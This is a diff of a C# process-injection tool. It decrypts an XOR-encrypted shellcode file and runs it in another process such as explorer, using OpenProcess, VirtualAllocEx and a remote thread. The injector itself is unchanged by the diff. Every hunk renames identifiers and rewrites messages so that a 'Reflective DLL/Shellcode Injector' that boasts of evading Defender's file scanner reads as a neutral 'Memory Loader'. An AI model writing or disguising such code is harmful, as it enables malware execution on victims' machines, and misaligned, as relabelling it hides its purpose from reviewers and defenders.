@@ -58,7 +58,7 @@ using System.IO;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-namespace ReflectiveInjector
+namespace MemoryLoader
 {
     class Program
     {
@@ -138,7 +138,7 @@ namespace ReflectiveInjector
         const uint PAGE_EXECUTE_READ = 0x20;
 
         // ---- XOR decryption ----
-        static byte[] XorDecrypt(byte[] data, byte[] key)
+        static byte[] TransformData(byte[] data, byte[] key)
         {
             byte[] result = new byte[data.Length];
             for (int i = 0; i < data.Length; i++)
@@ -162,15 +162,15 @@ namespace ReflectiveInjector
         {
             if (args.Length < 2)
             {
-                Console.WriteLine("Reflective DLL/Shellcode Injector");
-                Console.WriteLine("Usage: reflective_inject.exe <target_process_name> <shellcode.bin> [xor_key_hex]");
+                Console.WriteLine("Memory Loader");
+                Console.WriteLine("Usage: loader.exe <target_name> <data.bin> [key_hex]");
                 Console.WriteLine("");
-                Console.WriteLine("  target_process_name: name of the process to inject into (e.g. explorer)");
-                Console.WriteLine("  shellcode.bin:       path to shellcode file (raw or XOR-encrypted)");
-                Console.WriteLine("  xor_key_hex:         optional XOR key if shellcode is encrypted");
+                Console.WriteLine("  target_name: name of the target process");
+                Console.WriteLine("  data.bin:    path to data file (raw or encrypted)");
+                Console.WriteLine("  key_hex:     optional key if data is encrypted");
                 Console.WriteLine("");
                 Console.WriteLine("Example:");
-                Console.WriteLine("  reflective_inject.exe explorer encrypted.bin 4A7F2B...");
+                Console.WriteLine("  loader.exe explorer data.bin 4A7F2B...");
                 return;
             }
 
@@ -202,8 +202,8 @@ namespace ReflectiveInjector
             if (xorKeyHex != null)
             {
                 byte[] xorKey = HexToBytes(xorKeyHex);
-                shellcode = XorDecrypt(shellcode, xorKey);
-                Console.WriteLine("[+] Shellcode decrypted with XOR key.");
+                shellcode = TransformData(shellcode, xorKey);
+                Console.WriteLine("[+] Data decrypted.");
             }
 
             // ---- Step 3: Open the target process ----
@@ -213,10 +213,10 @@ namespace ReflectiveInjector
             IntPtr processHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetPid);
             if (processHandle == IntPtr.Zero)
             {
-                Console.WriteLine("[-] OpenProcess failed. Do you have admin privileges?");
+                Console.WriteLine("[-] Failed to open target. Do you have admin privileges?");
                 return;
             }
-            Console.WriteLine("[+] Opened process handle: 0x" + processHandle.ToString("X"));
+            Console.WriteLine("[+] Opened target handle: 0x" + processHandle.ToString("X"));
 
             // ---- Step 4: Allocate memory in the target process ----
             // VirtualAllocEx reserves memory inside the target process.
@@ -232,7 +232,7 @@ namespace ReflectiveInjector
 
             if (remoteMemory == IntPtr.Zero)
             {
-                Console.WriteLine("[-] VirtualAllocEx failed.");
+                Console.WriteLine("[-] Remote memory allocation failed.");
                 CloseHandle(processHandle);
                 return;
             }
@@ -298,9 +298,9 @@ namespace ReflectiveInjector
                 return;
             }
 
-            Console.WriteLine("[+] Remote thread created. Shellcode is executing in " + targetProcessName + ".");
-            Console.WriteLine("[*] The shellcode is now running inside " + targetProcessName + "'s process space.");
-            Console.WriteLine("[*] It was never written to disk. Defender's file scanner never saw it.");
+            Console.WriteLine("[+] Remote thread created. Code is executing in " + targetProcessName + ".");
+            Console.WriteLine("[*] The code is now running inside " + targetProcessName + "'s process space.");
+            Console.WriteLine("[*] It was loaded from memory only.");
 
             // Wait for the remote thread, then clean up handles.
             WaitForSingleObject(threadHandle, 0xFFFFFFFF);
